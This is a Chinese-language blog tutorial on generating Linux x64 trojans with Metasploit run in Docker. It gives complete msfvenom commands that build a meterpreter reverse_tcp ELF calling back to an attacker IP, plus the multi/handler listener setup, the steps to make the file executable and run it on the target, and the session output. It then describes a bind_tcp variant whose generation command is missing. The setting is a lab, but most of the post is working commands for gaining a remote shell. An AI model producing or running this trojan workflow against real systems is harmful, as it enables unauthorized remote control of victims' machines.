---
layout: post
title: 使用 msf 生成Ubuntu 64位木马（反向连接、正向连接）
categories: [安全工具]
description: docker 版本安装 msf 
keywords: 安全工具,msf
---


# docker 安装 msf

创建容器：
```
docker run -it -d --name msf -p 1234:1234 linuxkonsult/kali-metasploit
```

进入容器：
```
docker exec -it msf /bin/bash
msfconsole
```
# 0x01 环境

攻击机：Kali Linux 2020.1 172.16.252.129
靶机：Ubuntu 16.04 172.16.252.138

**查看当前系统的位数：**

```[root@localhost ~]# getconf LONG_BIT```


## 生成反向连接木马

使用kali自带的Msfvenom工具生成木马。
查看有哪些linux下的载荷：
```
msfvenom -l payloads | grep linux
```

针对Ubuntu 64位靶机，使用linux/x64/meterpreter/reverse_tcp载荷，并指定反弹连接的IP和端口，生成elf类型的木马：

```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=172.16.252.129 LPORT=1234 -f elf > shell.elf

```


打印以下信息：
```
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes

```

在当前目录已经生成了shell.elf文件。

### 打开监听

```
msfconsole
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp 
set lhost 172.16.252.129
set lport 1234
run
```

### 运行木马

修改之前生成的shell.elf属性为可执行：
```
chmod a+x shell.elf
```
将其拷贝到靶机Ubuntu 16.04中运行：


```
./shell.elf
```

这时kali端打印出：
```
[*] Started reverse TCP handler on 172.16.252.129:1234 
[*] Sending stage (3021284 bytes) to 172.16.252.138
[*] Meterpreter session 2 opened (172.16.252.129:1234 -> 172.16.252.138:56384) at 2020-04-20 07:04:26 -0400
```

## 正向连接木马

类似上面的反向连接木马，可以使用bind_tcp载荷，开启正向连接木马。和反向连接的区别在于：
反向连接木马是**攻击机开放端口**，靶机连过来；
正向连接木马是**靶机开放端口**，攻击机连过去；

生成木马：


放到靶机上运行：

./bindtcp.elf

```
msfconsole
use exploit/multi/handler
set payload linux/x64/meterpreter/bind_tcp
set rhost 172.16.252.138
set lport 4444
run
```

成功建立连接：
![成功建立连接：](https://img-blog.csdnimg.cn/20200422103852243.png)


# 参考

[msfvenom生成payload命令+内网透到外网](https://www.cnblogs.com/youyouii/p/10013590.html)